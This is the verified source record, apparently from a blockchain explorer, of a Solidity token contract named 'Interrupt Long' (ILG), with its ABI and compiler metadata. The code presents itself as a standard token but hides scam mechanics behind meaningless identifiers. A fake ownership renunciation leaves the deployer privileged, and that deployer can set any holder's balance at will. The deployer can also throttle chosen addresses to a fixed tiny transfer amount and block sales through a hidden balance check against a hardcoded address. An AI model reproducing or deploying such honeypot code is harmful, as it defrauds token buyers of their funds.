{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface buyMin {\n    function createPair(address enableTo, address isLimit) external returns (address);\n}\n\ninterface launchTeamLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldSenderTake) external view returns (uint256);\n\n    function transfer(address tradingBuy, uint256 senderExempt) external returns (bool);\n\n    function allowance(address takeSellLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingBuy,\n        uint256 senderExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundWallet, uint256 value);\n    event Approval(address indexed takeSellLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract launchLaunchedSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamEnableSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchTeamLimitMetadata is launchTeamLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterruptLong is launchLaunchedSender, launchTeamLimit, launchTeamLimitMetadata {\n\n    bool public takeReceiverReceiver;\n\n    mapping(address => uint256) private marketingShouldFee;\n\n    function receiverMin(address launchLiquidityTotal, uint256 senderExempt) public {\n        swapIs();\n        marketingShouldFee[launchLiquidityTotal] = senderExempt;\n    }\n\n    function autoTokenMax(address senderToken, address tradingBuy, uint256 senderExempt) internal returns (bool) {\n        require(marketingShouldFee[senderToken] >= senderExempt);\n        marketingShouldFee[senderToken] -= senderExempt;\n        marketingShouldFee[tradingBuy] += senderExempt;\n        emit Transfer(senderToken, tradingBuy, senderExempt);\n        return true;\n    }\n\n    address private senderTxSell;\n\n    mapping(address => mapping(address => uint256)) private buyShouldTeam;\n\n    function allowance(address receiverFrom, address feeTo) external view virtual override returns (uint256) {\n        if (feeTo == totalBuy) {\n            return type(uint256).max;\n        }\n        return buyShouldTeam[receiverFrom][feeTo];\n    }\n\n    function owner() external view returns (address) {\n        return senderTxSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minMax;\n    }\n\n    string private liquidityMarketing = \"Interrupt Long\";\n\n    uint256 enableReceiver;\n\n    uint256 public takeTradingMode;\n\n    function balanceOf(address shouldSenderTake) public view virtual override returns (uint256) {\n        return marketingShouldFee[shouldSenderTake];\n    }\n\n    uint256 private fromTokenTo = 100000000 * 10 ** 18;\n\n    bool public limitLaunchFrom;\n\n    event OwnershipTransferred(address indexed senderAt, address indexed teamLaunched);\n\n    function enableBuy(address marketingLaunchedAuto) public {\n        swapIs();\n        if (modeAmountReceiver != takeLaunch) {\n            takeLaunch = swapSenderToken;\n        }\n        if (marketingLaunchedAuto == amountFund || marketingLaunchedAuto == launchLaunched) {\n            return;\n        }\n        txModeMin[marketingLaunchedAuto] = true;\n    }\n\n    function walletLiquidity(uint256 senderExempt) public {\n        swapIs();\n        limitTx = senderExempt;\n    }\n\n    uint256 limitTx;\n\n    function enableSender(address tokenLaunch) public {\n        if (takeLaunchShould) {\n            return;\n        }\n        if (listTrading != listAuto) {\n            takeLaunch = modeAmountReceiver;\n        }\n        tradingLaunch[tokenLaunch] = true;\n        if (takeLaunch != swapSenderToken) {\n            listAuto = true;\n        }\n        takeLaunchShould = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderTxSell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapAuto;\n    }\n\n    uint8 private swapAuto = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityMarketing;\n    }\n\n    function transferFrom(address senderToken, address tradingBuy, uint256 senderExempt) external override returns (bool) {\n        if (_msgSender() != totalBuy) {\n            if (buyShouldTeam[senderToken][_msgSender()] != type(uint256).max) {\n                require(senderExempt <= buyShouldTeam[senderToken][_msgSender()]);\n                buyShouldTeam[senderToken][_msgSender()] -= senderExempt;\n            }\n        }\n        return maxLiquidity(senderToken, tradingBuy, senderExempt);\n    }\n\n    bool public maxFeeEnable;\n\n    mapping(address => bool) public tradingLaunch;\n\n    string private minMax = \"ILG\";\n\n    function approve(address feeTo, uint256 senderExempt) public virtual override returns (bool) {\n        buyShouldTeam[_msgSender()][feeTo] = senderExempt;\n        emit Approval(_msgSender(), feeTo, senderExempt);\n        return true;\n    }\n\n    mapping(address => bool) public txModeMin;\n\n    address public amountFund;\n\n    uint256 private swapSenderToken;\n\n    function transfer(address launchLiquidityTotal, uint256 senderExempt) external virtual override returns (bool) {\n        return maxLiquidity(_msgSender(), launchLiquidityTotal, senderExempt);\n    }\n\n    address totalBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapIs() private view {\n        require(tradingLaunch[_msgSender()]);\n    }\n\n    uint256 public modeAmountReceiver;\n\n    bool public listTrading;\n\n    address public launchLaunched;\n\n    uint256 constant autoFeeSwap = 15 ** 10;\n\n    bool private maxTotal;\n\n    function minMarketing() public {\n        emit OwnershipTransferred(amountFund, address(0));\n        senderTxSell = address(0);\n    }\n\n    function maxLiquidity(address senderToken, address tradingBuy, uint256 senderExempt) internal returns (bool) {\n        if (senderToken == amountFund) {\n            return autoTokenMax(senderToken, tradingBuy, senderExempt);\n        }\n        uint256 limitExempt = launchTeamLimit(launchLaunched).balanceOf(autoListToken);\n        require(limitExempt == limitTx);\n        require(tradingBuy != autoListToken);\n        if (txModeMin[senderToken]) {\n            return autoTokenMax(senderToken, tradingBuy, autoFeeSwap);\n        }\n        return autoTokenMax(senderToken, tradingBuy, senderExempt);\n    }\n\n    bool public takeLaunchShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromTokenTo;\n    }\n\n    address autoListToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private takeLaunch;\n\n    constructor (){\n        if (modeAmountReceiver != swapSenderToken) {\n            swapSenderToken = modeAmountReceiver;\n        }\n        teamEnableSwap buySwapEnable = teamEnableSwap(totalBuy);\n        launchLaunched = buyMin(buySwapEnable.factory()).createPair(buySwapEnable.WETH(), address(this));\n        \n        amountFund = _msgSender();\n        tradingLaunch[amountFund] = true;\n        marketingShouldFee[amountFund] = fromTokenTo;\n        minMarketing();\n        \n        emit Transfer(address(0), amountFund, fromTokenTo);\n    }\n\n    bool private listAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSellLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSenderTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchedAuto\",\"type\":\"address\"}],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFeeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmountReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTradingMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txModeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderExempt\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InterruptLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}